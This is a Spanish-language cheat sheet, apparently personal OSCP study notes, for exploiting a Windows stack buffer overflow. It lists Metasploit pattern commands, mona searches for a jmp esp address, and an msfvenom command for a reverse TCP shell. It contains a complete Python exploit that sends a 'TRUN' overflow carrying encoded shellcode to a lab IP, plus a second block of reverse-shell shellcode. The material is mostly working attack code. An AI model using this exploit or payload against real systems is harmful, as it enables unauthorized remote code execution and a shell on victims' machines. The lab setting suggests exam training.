# Buffer Overflow

Se indican los distintos pasos para completar el Buffer OverFlow en Windows

1) Encontrar el Offset para sobreescribir el EIP. __Importante:__ Recordar ajustar con divide y venceras si no se sobreescribe a la primera
<pre>
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q VALOR_EIP
</pre>

2) encontrar los badcharacters interpretables por el programa

<pre>
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<b>
badchars= (
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
</b>

buf =  ""
buf += "\xda\xdb\xbf\x4d\xc2\x72\x12\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x56\x83\xc0\x04\x31\x78\x14\x03\x78\x59\x20"
buf += "\x87\xee\x89\x26\x68\x0f\x49\x47\xe0\xea\x78\x47\x96"
buf += "\x7f\x2a\x77\xdc\xd2\xc6\xfc\xb0\xc6\x5d\x70\x1d\xe8"
buf += "\xd6\x3f\x7b\xc7\xe7\x6c\xbf\x46\x6b\x6f\xec\xa8\x52"
buf += "\xa0\xe1\xa9\x93\xdd\x08\xfb\x4c\xa9\xbf\xec\xf9\xe7"
buf += "\x03\x86\xb1\xe6\x03\x7b\x01\x08\x25\x2a\x1a\x53\xe5"
buf += "\xcc\xcf\xef\xac\xd6\x0c\xd5\x67\x6c\xe6\xa1\x79\xa4"
buf += "\x37\x49\xd5\x89\xf8\xb8\x27\xcd\x3e\x23\x52\x27\x3d"
buf += "\xde\x65\xfc\x3c\x04\xe3\xe7\xe6\xcf\x53\xcc\x17\x03"
buf += "\x05\x87\x1b\xe8\x41\xcf\x3f\xef\x86\x7b\x3b\x64\x29"
buf += "\xac\xca\x3e\x0e\x68\x97\xe5\x2f\x29\x7d\x4b\x4f\x29"
buf += "\xde\x34\xf5\x21\xf2\x21\x84\x6b\x9a\x86\xa5\x93\x5a"
buf += "\x81\xbe\xe0\x68\x0e\x15\x6f\xc0\xc7\xb3\x68\x51\xcf"
buf += "\x43\xa6\xd9\x80\xbd\x47\x19\x88\x79\x13\x49\xa2\xa8"
buf += "\x1c\x02\x32\x54\xc9\xbe\x38\xc2\xf8\x35\x3d\x74\x95"
buf += "\x4b\x3d\x79\xde\xc2\xdb\x29\x70\x84\x73\x8a\x20\x64"
buf += "\x24\x62\x2b\x6b\x1b\x92\x54\xa6\x34\x39\xbb\x1e\x6c"
buf += "\xd6\x22\x3b\xe6\x47\xaa\x96\x82\x48\x20\x12\x72\x06"
buf += "\xc1\x57\x60\x7f\xb6\x97\x78\x80\x53\x97\x12\x84\xf5"
buf += "\xc0\x8a\x86\x20\x26\x15\x78\x07\x35\x52\x86\xd6\x0f"
buf += "\x28\xb1\x4c\x2f\x46\xbe\x80\xaf\x96\xe8\xca\xaf\xfe"
buf += "\x4c\xaf\xfc\x1b\x93\x7a\x91\xb7\x06\x85\xc3\x64\x80"
buf += "\xed\xe9\x53\xe6\xb1\x12\xb6\x74\xb5\xec\x44\x53\x1e"
buf += "\x84\xb6\xe3\x9e\x54\xdd\xe3\xce\x3c\x2a\xcb\xe1\x8c"
buf += "\xd3\xc6\xa9\x84\x5e\x87\x18\x35\x5e\x82\xfd\xeb\x5f"
buf += "\x21\x26\x1c\x25\x4a\xd9\xdd\xda\x42\xbe\xde\xda\x6a"
buf += "\xc0\xe3\x0c\x53\xb6\x22\x8d\xe0\xc9\x11\xb0\x41\x40"
buf += "\x59\xe6\x92\x41"


# \x71\xe8\x20\x77


sc = "A"*2006 + "\x71\xe8\x20\x77" + "\x90"*50 + buf

buffer = sc 
try:
	print "\nSending evil buffer..."
	s.connect(('10.11.27.79',9999))
	data = s.recv(1024)
	s.send('TRUN .'+ buffer +'\r\n')
	data = s.recv(1024)
	s.send('EXIT\r\n')
	data = s.recv(1024)
	s.close()
except:
	print "Could not connect to POP3!"
</pre>

3) Buscar la instruccion __jmp esp__ en el programa
<pre>
Click derecho. Seach command --> jmp esp
</pre>

4) Buscar la instruccion __jmp esp__ en los modulos del programa
<pre>
1) Encontrar los modulos del programa:  <b>!mona modules</b>. Fijarse en que no tengan DEP ni ASLR.

2) Buscar la instruccion <b>jmp esp</b> en el modulo identificado. Seleccionar el modulo --> Seleccionar <b>c</b>. Ejecutar <b>!mona find -s "\xFF\xE4" -m MODULO</b>
</pre>

5) Generar el payload para Windows
<pre>
<b>msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -b '\x0a\x0d\x00' -f python </b>

<b>Ejemplo</b>
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of python file: 1772 bytes
buf =  ""
buf += "\xbd\xbb\xbd\xba\x18\xda\xd8\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x56\x31\x6f\x13\x03\x6f\x13\x83\xc7\xbf\x5f"
buf += "\x4f\xe4\x57\x1d\xb0\x15\xa7\x42\x38\xf0\x96\x42\x5e"
buf += "\x70\x88\x72\x14\xd4\x24\xf8\x78\xcd\xbf\x8c\x54\xe2"
buf += "\x08\x3a\x83\xcd\x89\x17\xf7\x4c\x09\x6a\x24\xaf\x30"
buf += "\xa5\x39\xae\x75\xd8\xb0\xe2\x2e\x96\x67\x13\x5b\xe2"
buf += "\xbb\x98\x17\xe2\xbb\x7d\xef\x05\xed\xd3\x64\x5c\x2d"
buf += "\xd5\xa9\xd4\x64\xcd\xae\xd1\x3f\x66\x04\xad\xc1\xae"
buf += "\x55\x4e\x6d\x8f\x5a\xbd\x6f\xd7\x5c\x5e\x1a\x21\x9f"
buf += "\xe3\x1d\xf6\xe2\x3f\xab\xed\x44\xcb\x0b\xca\x75\x18"
buf += "\xcd\x99\x79\xd5\x99\xc6\x9d\xe8\x4e\x7d\x99\x61\x71"
buf += "\x52\x28\x31\x56\x76\x71\xe1\xf7\x2f\xdf\x44\x07\x2f"
buf += "\x80\x39\xad\x3b\x2c\x2d\xdc\x61\x38\x82\xed\x99\xb8"
buf += "\x8c\x66\xe9\x8a\x13\xdd\x65\xa6\xdc\xfb\x72\xbf\xcb"
buf += "\xfb\xad\x07\x9b\x05\x4e\x77\xb5\xc1\x1a\x27\xad\xe0"
buf += "\x22\xac\x2d\x0c\xf7\x58\x24\x9a\x38\x34\xc7\xd5\xd1"
buf += "\x46\x38\xfb\x7d\xcf\xde\xab\x2d\x9f\x4e\x0c\x9e\x5f"
buf += "\x3f\xe4\xf4\x50\x60\x14\xf7\xbb\x09\xbf\x18\x15\x61"
buf += "\x28\x80\x3c\xf9\xc9\x4d\xeb\x87\xca\xc6\x19\x77\x84"
buf += "\x2e\x68\x6b\xf1\x48\x92\x73\x02\xfd\x92\x19\x06\x57"
buf += "\xc5\xb5\x04\x8e\x21\x1a\xf6\xe5\x32\x5d\x08\x78\x02"
buf += "\x15\x3f\xee\x2a\x41\x40\xfe\xaa\x91\x16\x94\xaa\xf9"
buf += "\xce\xcc\xf9\x1c\x11\xd9\x6e\x8d\x84\xe2\xc6\x61\x0e"
buf += "\x8b\xe4\x5c\x78\x14\x17\x8b\xfa\x53\xe7\x49\xd5\xfb"
buf += "\x8f\xb1\x65\xfc\x4f\xd8\x65\xac\x27\x17\x49\x43\x87"
buf += "\xd8\x40\x0c\x8f\x53\x05\xfe\x2e\x63\x0c\x5e\xee\x64"
buf += "\xa3\x7b\x01\x1e\xcc\x7c\xe2\xdf\xc4\x18\xe3\xdf\xe8"
buf += "\x1e\xd8\x09\xd1\x54\x1f\x8a\x66\x66\x2a\xaf\xcf\xed"
buf += "\x54\xe3\x10\x24"
</pre>

6) Activar el Multihandler 
<pre>
<b>$OSCP/explotacion/multi-handler/generator.sh windows/shell/reverse_tcp $LHOST $LPORT</b>
</pre>